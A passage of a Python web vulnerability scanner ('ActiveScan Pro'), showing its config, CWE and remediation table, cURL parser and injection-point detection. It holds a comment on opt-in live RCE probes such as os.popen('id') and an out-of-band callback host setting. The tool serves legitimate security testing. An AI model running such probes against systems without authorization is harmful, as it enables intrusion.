#!/usr/bin/env python3
"""
ActiveScan Pro v2.0 — BurpSuite-style Active Security Scanner
Context-Aware · Multi-Threaded · WAF-Aware · OWASP TOP 10 Aligned

Usage:
  python Scan.py --curl 'curl https://example.com/api?id=1'
  python Scan.py --file curl.txt --output report.html --threads 8
  python Scan.py --proxy http://127.0.0.1:8080 --file curl.txt
  python Scan.py --delay 0.5 --file curl.txt
  python Scan.py --profile quick --file curl.txt
  python Scan.py --module sqli,xss --file curl.txt
  python Scan.py --skip-module idor,massassign --file curl.txt
  python Scan.py --verbose --file curl.txt
  python Scan.py                                     ← interactive mode
"""

# ─────────────────────────────────────────────────────────────────────────────
# IMPORTS
# ─────────────────────────────────────────────────────────────────────────────
import argparse, os, shlex, urllib.parse, requests, time, re, json, base64, copy, uuid
import warnings, threading, hmac, hashlib, socket, ssl
import html as _html
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Set
from collections import Counter
from concurrent.futures import ThreadPoolExecutor, as_completed
from statistics import median, stdev as _stdev

try:
    from colorama import Fore, Style, init as _cinit
    _cinit(autoreset=True)
except ImportError:
    class _Stub:
        def __getattr__(self, _): return ''
    Fore = Style = _Stub()

warnings.filterwarnings('ignore')

# ── Globals ───────────────────────────────────────────────────────────────
_LOCK = threading.Lock()
_VERBOSE = False
_ALLOW_RCE = False   # opt-in: live RCE payloads (e.g. os.popen('id')) for SSTI confirmation
_PROBE_META = threading.local()  # per-thread param/payload labels for send_full_json probes

def tprint(*a, **kw):
    with _LOCK: print(*a, **kw)

def vprint(*a, **kw):
    """Verbose-only print (ARCH-06)."""
    if _VERBOSE:
        tprint(*a, **kw)

def _safe_stdev(data):
    return _stdev(data) if len(data) >= 2 else 0.0


# ─────────────────────────────────────────────────────────────────────────────
# CENTRAL CONFIG  — every tunable threshold / timing / limit in one place.
#   All values are overridable via environment variables (prefix APISCAN_),
#   so behaviour can be tuned per-target without touching code.  Defaults match
#   the original hard-coded values, so existing behaviour is unchanged.
# ─────────────────────────────────────────────────────────────────────────────
def _env_num(name: str, default, cast=float):
    """Read APISCAN_<NAME> from env, cast it, fall back to default on any error."""
    raw = os.environ.get(f"APISCAN_{name}")
    if raw is None or raw == "":
        return default
    try:
        return cast(raw)
    except (ValueError, TypeError):
        return default


class ScanConfig:
    # ── Networking ──────────────────────────────────────────────────────────
    HTTP_TIMEOUT      = _env_num("HTTP_TIMEOUT", 10, int)
    THREADS           = _env_num("THREADS", 6, int)
    BASELINE_SAMPLES  = _env_num("BASELINE_SAMPLES", 3, int)
    RETRY_COUNT       = _env_num("RETRY_COUNT", 1, int)
    RETRY_SLEEP       = _env_num("RETRY_SLEEP", 0.5, float)

    # ── Adaptive backoff / circuit-breaker (429 & connection errors) ─────────
    BACKOFF_ERROR_THRESHOLD = _env_num("BACKOFF_ERROR_THRESHOLD", 5, int)   # consecutive failures before backing off
    BACKOFF_BASE            = _env_num("BACKOFF_BASE", 0.5, float)          # base seconds, doubles each step
    BACKOFF_MAX             = _env_num("BACKOFF_MAX", 8.0, float)           # cap on backoff sleep
    RATELIMIT_PAUSE         = _env_num("RATELIMIT_PAUSE", 2.0, float)       # pause after a 429

    # ── Insertion points ────────────────────────────────────────────────────
    JSON_MAX_DEPTH    = _env_num("JSON_MAX_DEPTH", 5, int)   # was 3 — deeper coverage
    XML_INSERTION     = _env_num("XML_INSERTION", 1, int)    # 1=enabled, parse XML element values

    # ── Time-based blind injection (SQLi / CMDi) ────────────────────────────
    TIME_DELAY              = _env_num("TIME_DELAY", 5, int)            # sleep payload duration (s)
    TIME_THRESHOLD_MARGIN   = _env_num("TIME_THRESHOLD_MARGIN", 0.5, float)
    TIME_THRESHOLD_RATIO    = _env_num("TIME_THRESHOLD_RATIO", 0.65, float)
    TIME_CONTROL_MAX_RATIO  = _env_num("TIME_CONTROL_MAX_RATIO", 1.5, float)

    # ── Boolean-blind injection ─────────────────────────────────────────────
    BOOL_STDDEV_MULT  = _env_num("BOOL_STDDEV_MULT", 3, float)
    BOOL_MEAN_RATIO   = _env_num("BOOL_MEAN_RATIO", 0.05, float)
    BOOL_FALLBACK_RATIO = _env_num("BOOL_FALLBACK_RATIO", 0.15, float)

    # ── NoSQL data-leak heuristic ───────────────────────────────────────────
    NOSQL_GROWTH_RATIO = _env_num("NOSQL_GROWTH_RATIO", 1.5, float)
    NOSQL_MIN_LEN      = _env_num("NOSQL_MIN_LEN", 100, int)

    # ── Rate-limit / business-logic ─────────────────────────────────────────
    RATELIMIT_BURST   = _env_num("RATELIMIT_BURST", 20, int)

    # ── Out-of-Band (interactsh / Collaborator equivalent) ──────────────────
    OOB_PUBLIC_FALLBACK = os.environ.get("APISCAN_OOB_FALLBACK", "oast.pro")
    OOB_SERVER          = os.environ.get("APISCAN_OOB_SERVER") or None
    OOB_TOKEN           = os.environ.get("APISCAN_OOB_TOKEN") or None
    OOB_WAIT            = _env_num("OOB_WAIT", 8, int)
    # Cap OOB payloads per insertion point (keeps scans from exploding)
    OOB_MAX_PER_POINT   = _env_num("OOB_MAX_PER_POINT", 8, int)

    # ── Evidence ────────────────────────────────────────────────────────────
    SNIPPET_LEN       = _env_num("SNIPPET_LEN", 500, int)

    # ── Service ─────────────────────────────────────────────────────────────
    BACKEND_PORT      = _env_num("BACKEND_PORT", 8775, int)


CFG = ScanConfig()


# ─────────────────────────────────────────────────────────────────────────────
# DATA MODELS
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class ScanRequest:
    url:     str
    method:  str                = "GET"
    headers: Dict[str, str]    = field(default_factory=dict)
    body:    Optional[str]     = None
    cookies: Dict[str, str]    = field(default_factory=dict)

@dataclass
class Issue:
    severity:      str   # CRITICAL | HIGH | MEDIUM | LOW | INFO
    vulnerability: str
    parameter:     str
    payload:       str
    evidence:      str
    url:           str
    param_type:    str  = ""
    request_info:  str  = ""          # ARCH-07: request detail
    response_snippet: str = ""        # ARCH-07: response excerpt
    # ── Burp-style metadata (auto-filled by __post_init__) ───────────────────
    confidence:    str  = ""          # Certain | Firm | Tentative
    cwe:           str  = ""          # e.g. "CWE-89"
    remediation:   str  = ""          # one-line fix guidance
    attack_body:   str  = ""          # exact JSON/body that triggered this finding

    def __post_init__(self):
        # Enrich with CWE / remediation / confidence based on the vuln name.
        # Safe to call even if the metadata table isn't defined yet.
        try:
            _apply_vuln_meta(self)
        except NameError:
            pass


# ─────────────────────────────────────────────────────────────────────────────
# VULN METADATA  — CWE + one-line remediation per finding class (Burp-style).
#   Keys are UPPERCASE substrings matched against Issue.vulnerability; the
#   longest matching key wins, so specific names beat generic ones.
# ─────────────────────────────────────────────────────────────────────────────
VULN_META: Dict[str, Tuple[str, str]] = {
    "SQL INJECTION":        ("CWE-89",  "Use parameterized queries / prepared statements; never concatenate user input into SQL."),
    "NOSQL":                ("CWE-943", "Type-cast and validate input; reject query operators ($ne,$gt,$where) in user-controlled keys."),
    "XSS":                  ("CWE-79",  "Context-encode all output; apply a strict Content-Security-Policy; rely on framework auto-escaping."),
    "PATH TRAVERSAL":       ("CWE-22",  "Canonicalize and allowlist paths; reject ../ sequences; serve files by ID, not raw path."),
    "LFI":                  ("CWE-22",  "Canonicalize and allowlist paths; reject ../ sequences; serve files by ID, not raw path."),
    "COMMAND INJECTION":    ("CWE-78",  "Avoid the shell; use exec-array APIs without a shell; allowlist arguments."),
    "SSRF":                 ("CWE-918", "Allowlist outbound hosts; block link-local/metadata IPs; pin DNS; deny redirects."),
    "OPEN REDIRECT":        ("CWE-601", "Allowlist redirect targets; use relative paths or signed redirect tokens."),
    "CRLF":                 ("CWE-93",  "Strip CR/LF from header values; use header APIs that reject control characters."),
    "XXE":                  ("CWE-611", "Disable external-entity and DTD processing in the XML parser."),
    "SSTI":                 ("CWE-1336","Never render user input as a template; use logic-less templates; sandbox the engine."),
    "BROKEN OBJECT LEVEL":  ("CWE-639", "Enforce per-object authorization on every request; use unguessable IDs."),
    "IDOR":                 ("CWE-639", "Enforce per-object authorization on every request; use unguessable IDs."),
    "JWT":                  ("CWE-347", "Verify the signature with a fixed algorithm; reject 'none'; validate exp/aud/iss; rotate secrets."),
    "MASS ASSIGNMENT":      ("CWE-915", "Bind only an explicit allowlist of fields; never bind the request body straight to models."),
    "CORS":                 ("CWE-942", "Echo only allowlisted origins; never reflect an arbitrary Origin with credentials=true."),
    "GRAPHQL":              ("CWE-200", "Disable introspection in prod; enforce depth/complexity limits; authorize each resolver."),
    "PROTOTYPE POLLUTION":  ("CWE-1321","Reject __proto__/constructor keys; use Map or null-proto objects."),
    "PARAMETER POLLUTION":  ("CWE-235", "Normalize duplicate parameters server-side; reject unexpected duplicates."),
    "XPATH":                ("CWE-643", "Use parameterized XPath; escape or allowlist input."),
    "LDAP":                 ("CWE-90",  "Escape LDAP special characters; use parameterized filters."),
    "DESERIALIZATION":      ("CWE-502", "Never deserialize untrusted data; use signed/allowlisted formats; prefer JSON."),
    "RATE LIMIT":           ("CWE-770", "Apply per-identity rate limiting and lockouts on sensitive actions."),
    "BUSINESS LOGIC":       ("CWE-840", "Validate quantities/amounts server-side; enforce invariants and bounds."),
    "SMUGGLING":            ("CWE-444", "Use one HTTP parser end-to-end; reject ambiguous CL/TE; normalize at the edge."),
    "SECURITY HEADER":      ("CWE-693", "Set the missing headers (HSTS, CSP, X-Frame-Options, X-Content-Type-Options)."),
    "SERVER VERSION":       ("CWE-200", "Suppress the server version banner."),
    "SERVER NAME":          ("CWE-200", "Suppress server/tech-identifying banners and error-page strings."),
    "TECHNOLOGY DISCLOSURE":("CWE-200", "Remove X-Powered-By and similar tech-identifying headers."),
    "STACK TRACE":          ("CWE-209", "Return generic errors; log details server-side only; disable debug in prod."),
    "DEBUG MODE":           ("CWE-489", "Disable debug/profiler endpoints and headers in production."),
    "SENSITIVE DATA":       ("CWE-200", "Never return secrets/keys in responses; redact and rotate exposed credentials."),
    "SUBDOMAIN TAKEOVER":   ("CWE-350", "Remove dangling DNS records that point to unclaimed services."),
    "API VERSION":          ("CWE-1059","Decommission deprecated API versions; enforce auth consistently across versions."),
    "HOST HEADER":          ("CWE-644", "Validate Host against an allowlist; never build absolute URLs from the Host header."),
    "CSRF":                 ("CWE-352", "Require anti-CSRF tokens on state-changing requests; set SameSite=Lax/Strict cookies."),
    "BROKEN FUNCTION":      ("CWE-285", "Enforce function-level authorization on every route; never rely on hiding /admin URLs or HTTP method alone."),
    "METHOD OVERRIDE":      ("CWE-285", "Ignore client method-override headers unless the caller is already authorized for that method."),
    "JWT TOKEN IN RESPONSE":("CWE-200", "Don't return JWTs in response bodies unless required; treat them as sensitive."),
    "EXCESSIVE DATA":       ("CWE-200", "Omit secrets and high-signal PII from API responses; return only fields the caller needs."),
    "BLIND":                ("CWE-918", "An OOB callback confirms injection; remediate the underlying vector (SQLi/CMDi/SSRF/XXE)."),
}

_CONFIDENCE_CERTAIN = ("OOB", "CALLBACK", "INTERACTION", "MISSING SECURITY HEADER",
                       "DISCLOSURE", "DEBUG MODE", "STACK TRACE", "TECHNOLOGY",
                       "WAF DETECTED", "DISCLOSED")
_CONFIDENCE_FIRM    = ("ERROR-BASED", "UNION-BASED", "AUTH BYPASS", "INTROSPECTION",
                       "TIME-BASED", "BOOLEAN", "BLIND", "SMUGGLING", "TAKEOVER")

def _infer_confidence(name_upper: str) -> str:
    """Heuristic Burp-style confidence from the vulnerability name."""
    if any(k in name_upper for k in _CONFIDENCE_CERTAIN): return "Certain"
    if any(k in name_upper for k in _CONFIDENCE_FIRM):    return "Firm"
    # Pure reflection without execution proof is only tentative
    if "REFLECT" in name_upper:                            return "Tentative"
    return "Firm"

def _apply_vuln_meta(iss: 'Issue') -> None:
    """Fill cwe / remediation / confidence on an Issue (only blanks)."""
    name = (iss.vulnerability or "").upper()
    if not iss.cwe or not iss.remediation:
        best_kw = ""
        for kw in VULN_META:
            if kw in name and len(kw) > len(best_kw):
                best_kw = kw
        if best_kw:
            cwe, rem = VULN_META[best_kw]
            if not iss.cwe:         iss.cwe = cwe
            if not iss.remediation: iss.remediation = rem
    if not iss.confidence:
        iss.confidence = _infer_confidence(name)


# ─────────────────────────────────────────────────────────────────────────────
# cURL PARSER  — supports $'...' ANSI-C quoting, all common flags
# ─────────────────────────────────────────────────────────────────────────────
class CurlParser:
    _VALUE_FLAGS = {
        '-X','--request', '-H','--header',
        '-d','--data','--data-raw','--data-binary','--data-urlencode',
        '-b','--cookie', '-u','--user', '-A','--user-agent', '-e','--referer',
        '--proxy','-x', '--max-time','--connect-timeout','--retry','--retry-delay',
        '-o','--output', '--upload-file','-T', '--form','-F',
        '--cert','--key','--cacert','--capath',
        '--json', '--url',
    }
    _BOOL_FLAGS = {
        '-s','--silent','-S','--show-error','-v','--verbose',
        '-i','--include','-I','--head','-L','--location',
        '-k','--insecure','--compressed','--no-keepalive',
        '--http1.0','--http1.1','--http2',
        '-g','--globoff','-G','--get','-f','--fail',
    }

    @staticmethod
    def _ansi_unescape(s: str) -> str:
        m = re.match(r"^\$'(.*)'$", s, re.DOTALL)
        if not m: return s
        inner = m.group(1)
        inner = inner.replace('\\n','\n').replace('\\t','\t').replace('\\r','\r')
        inner = re.sub(r'\\u([0-9a-fA-F]{4})', lambda x: chr(int(x.group(1),16)), inner)
        inner = re.sub(r'\\x([0-9a-fA-F]{2})', lambda x: chr(int(x.group(1),16)), inner)
        return inner

    @classmethod
    def _parse_shared(cls, raw: str) -> Optional['ScanRequest']:
        """Prefer shared AV-grade curl_parser when available."""
        try:
            try:
                from curl_parser import parse_curl_command
            except ImportError:
                import importlib.util, os
                here = os.path.dirname(os.path.abspath(__file__))
                for p in (
                    os.path.join(here, "curl_parser.py"),
                    os.path.join(here, "apiscan_backend", "curl_parser.py"),
                    os.path.join(os.path.dirname(here), "curl_parser.py"),
                ):
                    if os.path.isfile(p):
                        spec = importlib.util.spec_from_file_location("_scan_curl_parser", p)
                        mod = importlib.util.module_from_spec(spec)
                        spec.loader.exec_module(mod)
                        parse_curl_command = mod.parse_curl_command
                        break
                else:
                    return None
            d = parse_curl_command(raw)
            body = d.get("body_raw")
            if body is None and d.get("body") is not None:
                b = d["body"]
                if isinstance(b, (dict, list)):
                    body = json.dumps(b, ensure_ascii=False) if d.get("body_type") == "json" else (
                        "&".join(f"{k}={'' if v is None else v}" for k, v in b.items())
                        if isinstance(b, dict) else json.dumps(b)
                    )
                else:
                    body = str(b)
            req = ScanRequest(url=d.get("url") or "")
            req.method = (d.get("method") or "GET").upper()
            req.headers = dict(d.get("headers") or {})
            req.body = body or None
            req.cookies = dict(d.get("cookies") or {})
            for hk in ("Cookie", "cookie"):
                if hk in req.headers:
                    for pair in req.headers[hk].split(";"):
                        if "=" in pair:
                            k, _, v = pair.strip().partition("=")
                            req.cookies[k.strip()] = v.strip()
            return req
        except Exception:
            return None

    @classmethod
    def parse(cls, raw: str) -> 'ScanRequest':
        shared = cls._parse_shared(raw)
        if shared is not None and shared.url:
            return shared

        raw = raw.strip()
        raw = re.sub(r'^curl\s+', '', raw, flags=re.I)
        raw = re.sub(
            r"\$'((?:[^'\\]|\\.)*)'",
            lambda m: "'" + cls._ansi_unescape("$'" + m.group(1) + "'") + "'",
            raw)
        try:
            tokens = shlex.split(raw.replace('\\\n', ' '))
        except ValueError:
            tokens = raw.split()

        req = ScanRequest(url="")
        i = 0
        while i < len(tokens):
            t = tokens[i]
            if t in ('-X','--request') and i+1 < len(tokens):
                req.method = tokens[i+1].upper(); i += 2
            elif t in ('-H','--header') and i+1 < len(tokens):
                hdr = tokens[i+1]
                if ':' in hdr:
                    k, _, v = hdr.partition(':')
                    req.headers[k.strip()] = v.strip()
                i += 2
            elif t in ('-d','--data','--data-raw','--data-binary',
                       '--data-urlencode','--json') and i+1 < len(tokens):
                req.body = tokens[i+1]
                if req.method == "GET": req.method = "POST"
                i += 2
            elif t in ('-b','--cookie') and i+1 < len(tokens):
                for pair in tokens[i+1].split(';'):
                    if '=' in pair:
                        k, _, v = pair.strip().partition('=')
                        req.cookies[k.strip()] = v.strip()
                i += 2
            elif t in ('-u','--user') and i+1 < len(tokens):
                enc = base64.b64encode(tokens[i+1].encode()).decode()
                req.headers['Authorization'] = f'Basic {enc}'; i += 2
            elif t in ('-A','--user-agent') and i+1 < len(tokens):
                req.headers['User-Agent'] = tokens[i+1]; i += 2
            elif t in ('-e','--referer') and i+1 < len(tokens):
                req.headers['Referer'] = tokens[i+1]; i += 2
            elif t in cls._BOOL_FLAGS:
                i += 1
            elif t in cls._VALUE_FLAGS and i+1 < len(tokens):
                i += 2
            elif not t.startswith('-'):
                if not req.url: req.url = cls._ansi_unescape(t)
                i += 1
            else:
                i += 1

        for hk in ['Cookie', 'cookie']:
            if hk in req.headers:
                for pair in req.headers[hk].split(';'):
                    if '=' in pair:
                        k, _, v = pair.strip().partition('=')
                        req.cookies[k.strip()] = v.strip()
        return req


# ─────────────────────────────────────────────────────────────────────────────
# CONTEXT ANALYZER  — determines which modules to run per insertion point
# ─────────────────────────────────────────────────────────────────────────────
_NAME_HINTS: List[Tuple[str, re.Pattern]] = [
    ("url_like", re.compile(
        r"^(url|redirect|callback|next|return|dest(?:ination)?|uri|href"
        r"|src(?:url)?|source|link|location|redir|forward|to|goto|continue"
        r"|target|image|img|avatar|webhook|endpoint)$", re.I)),
    ("path_like", re.compile(
        r"^(file|path|dir(?:ectory)?|folder|include|load|read|open"
        r"|filename|filepath|attachment|document|resource|download"
        r"|import|export|config|log)$", re.I)),
    ("id_like", re.compile(
        r"^(.+_?id|uid|pid|uuid|guid|account(?:_?id)?|record(?:_?id)?"
        r"|item(?:_?id)?|order(?:_?id)?|user(?:_?id)?|entity(?:_?id)?"
        r"|emp(?:_?id)?|obj(?:_?id)?|ref|reference|doc_id|token_id)$", re.I)),
    ("cmd_like", re.compile(
        r"^(cmd|command|exec(?:ute)?|run|shell|ping|system|proc(?:ess)?"
        r"|daemon|host|ip|hostname)$", re.I)),
    ("search_like", re.compile(
        r"^(q|query|search|keyword|term|msg|message|text|filter|s|find"
        r"|lookup|name|title|subject|comment|description|input|data"
        r"|value|content|body|note|review)$", re.I)),
    ("template_like", re.compile(
        r"^(template|view|page|layout|theme|skin|tpl|render|format|output"
        r"|template_name|engine|expression)$", re.I)),
    ("auth_like", re.compile(
        r"^(user(?:name)?|login|email|pass(?:word)?|passwd|pwd|auth"
        r"|credential|token|session|apikey|api_key)$", re.I)),
]

def _value_type(value: str) -> str:
    v = (value or "").strip()
    try:
        float(v); return "numeric"
    except ValueError: pass
    if re.match(r'^https?://', v, re.I):        return "url"
    if re.search(r'(\.\.[\\/]|^\w:[\\/])', v) or (v.startswith('/') and len(v) > 1):
        return "filepath"
    if re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-', v, re.I):
        return "uuid"
    return "string"

def _name_hint(name: str) -> Optional[str]:
    clean_name = re.sub(r'^path\[\d+\]:?', '', name)
    for hint, pat in _NAME_HINTS:
        if pat.match(clean_name) or pat.match(name): return hint
    return None

# Pagination / search params — never schedule IDOR (high FP). Shared with IDORScanner.
_IDOR_NOISY_PARAM = re.compile(
    r"(^page$|^page_?num$|^page_?no$|limit|offset|skip|per.?page|cursor"
    r"|^start$|^count$|^size$|^num$|^rows$|^length$|^top$|^from$|^take$"
    r"|page.?size|page.?limit|page.?count|result.?size|result.?count"
    r"|^search$|^query$|^q$|filter|sort|order.?by|keyword|term)",
    re.I,
)

def _looks_serialized(value: str) -> bool:
    """Cheap shape check for Java/PHP/.NET serialized blobs."""
    v = (value or "").strip()
    if not v:
        return False
    if v.startswith("rO0AB") or v.startswith("O:") or v.startswith("a:"):
        return True
    if '"$type"' in v or "TypeNameHandling" in v:
        return True
    return False


def get_modules_for_point(point: Dict, content_type: str = "") -> List[str]:
    """Context-aware module selection — mirrors BurpSuite logic."""
    name  = point.get("name", "")
    value = str(point.get("value", ""))
    ptype = point.get("type", "")
    ct    = content_type.lower()
    vtype = _value_type(value)
    hint  = _name_hint(name)

    # Whole XML document → XXE priority. Per-element body_xml points are
    # excluded here so their values get normal injection modules below.
    if ("xml" in ct or ptype == "body_raw") and ptype != "body_xml":
        mods = ["xxe", "ssrf"]
    # Name hints take precedence
    elif hint == "url_like":      mods = ["ssrf", "redirect", "lfi"]
    elif hint == "path_like":     mods = ["lfi", "ssrf"]
    elif hint == "id_like":       mods = ["sqli", "nosqli", "idor", "cmdi"]
    elif hint == "cmd_like":      mods = ["cmdi"]
    elif hint == "search_like":   mods = ["xss", "ssti", "sqli", "nosqli", "xpath", "ldap"]
    elif hint == "template_like": mods = ["ssti", "xss"]
    elif hint == "auth_like":     mods = ["sqli", "nosqli", "ldap", "xss"]
    else:
        # Value type — skip IDOR on pagination/search param names (FP factory)
        _is_page_param = bool(_IDOR_NOISY_PARAM.search(name or ""))
        _idor_ok = not _is_page_param
        if vtype == "numeric":
            mods = ["sqli", "cmdi"] + (["idor"] if _idor_ok else []) + ["resource_exhaustion"]
        elif _is_page_param:
            mods = ["resource_exhaustion", "sqli", "nosqli"]
        elif vtype == "url":
            mods = ["ssrf", "redirect", "lfi"]
        elif vtype == "filepath":
            mods = ["lfi", "ssrf"]
        elif vtype == "uuid":
            mods = (["idor"] if _idor_ok else []) + ["sqli"]
        elif ptype == "header":
            mods = ["crlf", "xss", "ssti", "sqli"]
        elif ptype == "cookie":
            mods = ["sqli", "nosqli", "xss"]
        elif ptype == "path_segment":
            if vtype == "numeric":
                mods = ["sqli", "lfi", "nosqli"] + (["idor"] if _idor_ok else [])
            else:
                mods = ["lfi", "sqli"] + (["idor"] if _idor_ok else [])
        else:
            # Default: generic string
            mods = ["xss", "sqli", "nosqli", "ssti", "lfi", "ssrf", "redirect", "crlf", "xpath", "hpp"]

    # Deserialization: body JSON/raw always; elsewhere only when value looks serialized
    if ptype in ("body_json", "body_raw") or _looks_serialized(value):
        if "deserial" not in mods:
            mods = list(mods) + ["deserial"]
    return mods


# ─────────────────────────────────────────────────────────────────────────────
# INSERTION POINT DETECTOR
#   BUG-03 FIX: Recursive JSON flattening (nested objects up to depth 3)
#   IMP-01: URL path segment insertion points
#   BUG-01: JWT header handled separately (JWTScanner accesses directly)
# ─────────────────────────────────────────────────────────────────────────────
_SKIP_HEADERS = {
    'host','content-length','transfer-encoding','connection',
    'accept-encoding','cache-control','pragma','accept','accept-language',
    'sec-fetch-dest','sec-fetch-mode','sec-fetch-site',
    'sec-ch-ua','sec-ch-ua-mobile','sec-ch-ua-platform',
    'upgrade-insecure-requests','te',
}

def _flatten_json(obj, key_path=None, depth=0, max_depth=None, root=None):
    """BUG-03 FIX: Recursively walk JSON objects/arrays up to max_depth."""
    if max_depth is None: max_depth = CFG.JSON_MAX_DEPTH
    if key_path is None: key_path = []
    if root is None:     root = obj
    points = []
    if depth > max_depth: return points

    if isinstance(obj, dict):
        for k, v in obj.items():
            cur = key_path + [k]
            name = '.'.join(str(p) for p in cur)
            if isinstance(v, dict):
                points.extend(_flatten_json(v, cur, depth+1, max_depth, root))
            elif isinstance(v, list):
                for i, item in enumerate(v):
                    if isinstance(item, (dict, list)):
                        points.extend(_flatten_json(item, cur + [i], depth+1, max_depth, root))
                    else:
                        points.append({
                            'type': 'body_json', 'name': f"{name}[{i}]",
                            'value': str(item) if item is not None else '',
                            '_root_json': root, '_key_path': cur + [i],
                        })
            else:
                points.append({
                    'type': 'body_json', 'name': name,
                    'value': str(v) if v is not None else '',
                    '_root_json': root, '_key_path': cur,
                })
    elif isinstance(obj, list):
        for i, item in enumerate(obj):
            if isinstance(item, (dict, list)):
                points.extend(_flatten_json(item, key_path + [i], depth+1, max_depth, root))
    return points

def _set_nested(obj, path, value):
    """Navigate nested dict/list by path and set the leaf value."""
    for key in path[:-1]:
        obj = obj[key]
    obj[path[-1]] = value

def _is_uuid(v):
    return bool(re.match(r'^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$', v, re.I))

def _extract_path_template_name(part: str) -> Optional[str]:
    """Detect and return clean variable name if segment is a URL template placeholder."""
    if not part:
        return None
    # OpenAPI / Swagger / Spring / URI template format: {id}, {userId}, {order-id}, {{id}}
    m = re.match(r'^\{+([a-zA-Z0-9_-]+)\}+$', part)
    if m:
        return m.group(1)
    # Express / Sinatra / FastAPI route format: :id, :userId
    m = re.match(r'^:([a-zA-Z0-9_-]+)$', part)
    if m:
        return m.group(1)
    # Angle-bracket / Django / Flask format: <id>, <userId>, <int:id>, <str:slug>
    m = re.match(r'^<(?:\w+:)?([a-zA-Z0-9_-]+)>$', part)
    if m:
        return m.group(1)
    return None

def _is_path_segment_interesting(part):
    """Detect injectable path segments: numeric IDs, UUIDs, short slugs, or path templates."""
    if not part: return False
    if _extract_path_template_name(part): return True
    if re.match(r'^\d+$', part): return True
    if _is_uuid(part): return True
    # Short alphanumeric slug that LOOKS like an identifier — must contain a digit
    # (e.g. "user-42", "order_2024", "sku-AB123"), not a plain resource name like
    # "users"/"orders"/"products" which would otherwise cause false-positive injection points
    if (re.match(r'^[a-zA-Z0-9_-]{2,40}$', part) and re.search(r'\d', part)
            and part.lower() not in ('api','v1','v2','v3','v4','admin','auth','graphql',
                                     'health','status','docs','swagger','public','private')):
        return len(part) <= 30
    return False


# Leaf XML element text: <tag ...>value</tag> where value has no angle brackets.
# Backreference \1 ties the closing tag to the opening one. Namespaces allowed.
_XML_LEAF_RE = re.compile(r'<([A-Za-z_][\w.\-:]*)(?:\s[^>]*)?>([^<>]+)</\1\s*>')

def _xml_insertion_points(body: str) -> List[Dict]:
    """Leaf-element text values in an XML body → body_xml insertion points.
    Offsets of the inner text are stored so injection is unambiguous even when
    the same tag name repeats."""
    pts: List[Dict] = []
    for m in _XML_LEAF_RE.finditer(body):
        tag, inner = m.group(1), m.group(2)
        if not inner.strip():
            continue
        s, e = m.span(2)   # span of the inner text only (not the tags)
        pts.append({
            'type': 'body_xml', 'name': tag, 'value': inner,
            '_xml_inner_start': s, '_xml_inner_end': e,
        })
    return pts


def _multipart_boundary(ct: str, body: str) -> Optional[str]:
    m = re.search(r'boundary=(?:"([^"]+)"|([^;\s]+))', ct or "", re.I)
    if m:
        return m.group(1) or m.group(2)
    # Body often starts with --BOUNDARY\r\n
    m2 = re.match(r'-{2}([^\r\n]+)', body or "")
    return m2.group(1).strip() if m2 else None


def _multipart_insertion_points(body: str, boundary: str) -> List[Dict]:
    """
    Text (and short filename) fields inside multipart/form-data.
    Stores byte offsets of the value so RequestSender can splice payloads
    without rebuilding the whole MIME message.
    Skips large binary file contents (keeps filename= as a point).
    """
    if not body or not boundary:
        return []
    pts: List[Dict] = []
    # Split on --boundary (keep delimiters out)
    delim = "--" + boundary
    parts = body.split(delim)
    for part in parts:
        if not part or part.strip() in ("", "--"):
            continue
        # Drop leading CRLF
        raw = part[2:] if part.startswith("\r\n") else (part[1:] if part.startswith("\n") else part)
        if raw.startswith("--"):
            continue
        # Header / body split
        if "\r\n\r\n" in raw:
            hdr, val = raw.split("\r\n\r\n", 1)
        elif "\n\n" in raw:
            hdr, val = raw.split("\n\n", 1)
        else:
            continue
        # Strip trailing CRLF before next boundary residue
        if val.endswith("\r\n"):
            val = val[:-2]
        elif val.endswith("\n"):
            val = val[:-1]

        cd = re.search(
            r'Content-Disposition:\s*form-data;\s*name="([^"]+)"'
            r'(?:;\s*filename="([^"]*)")?',
            hdr, re.I,
        )
        if not cd:
            continue
        name, filename = cd.group(1), cd.group(2)

        # Locate value inside original body for accurate splice
        # Search unique marker: name="X" ... blank line ... value
        marker = f'name="{name}"'
        idx = body.find(marker)
        if idx < 0:
            continue
        # Find blank line after this part's headers
        after = body.find("\r\n\r\n", idx)
        sep_len = 4
        if after < 0:
            after = body.find("\n\n", idx)
            sep_len = 2
        if after < 0:
            continue
        v_start = after + sep_len
        # Value ends at next CRLF--boundary or end
        next_b = body.find("\r\n" + delim, v_start)
        if next_b < 0:
            next_b = body.find("\n" + delim, v_start)
        v_end = next_b if next_b >= 0 else len(body)
        actual = body[v_start:v_end]
        # Prefer filename injection over huge binary bodies
        if filename is not None:
            # Point on the filename attribute value
            fm = re.search(r'filename="([^"]*)"', hdr)
            if fm:
                # filename spans relative to hdr — map into body
                fpos = body.find(f'filename="{filename}"', idx)
                if fpos >= 0:
                    fs = fpos + len('filename="')
                    fe = fs + len(filename)
                    pts.append({
                        "type": "body_multipart",
                        "name": f"{name}[filename]",
                        "value": filename,
                        "_mp_start": fs,
                        "_mp_end": fe,
                    })
            # Skip binary content if large
            if len(actual) > 512:
                continue

        # Cap text field size
        if len(actual) > 4000:
            continue
        pts.append({
            "type": "body_multipart",
            "name": name,
            "value": actual,
            "_mp_start": v_start,
            "_mp_end": v_end,
        })
    return pts


def get_insertion_points(req: ScanRequest) -> List[Dict]:
    points = []
    parsed = urllib.parse.urlparse(req.url)

    # ── 1. URL query params ───────────────────────────────────
    for name, vals in urllib.parse.parse_qs(parsed.query, keep_blank_values=True).items():
        points.append({'type': 'query', 'name': name, 'value': vals[0]})

    # ── 2. URL path segments (IMP-01 & Path Template Discovery) ─
    path_parts = parsed.path.split('/')
    for idx, part in enumerate(path_parts):
        tpl_name = _extract_path_template_name(part)
        if tpl_name:
            points.append({
                'type': 'path_segment', 'name': f'path[{idx}]:{tpl_name}',
                'value': part, '_path_parts': list(path_parts), '_index': idx,
                '_template_var': tpl_name,
            })
        elif _is_path_segment_interesting(part):
            points.append({
                'type': 'path_segment', 'name': f'path[{idx}]',
                'value': part, '_path_parts': list(path_parts), '_index': idx,
            })

    # ── 3. Body params ────────────────────────────────────────
    # IMPORTANT: JSON must be detected BEFORE form-parsing.  parse_qs() with
    # keep_blank_values=True swallows an entire JSON object as a single
    # blank-valued "form param" (a JSON body has no '='), which collapses the
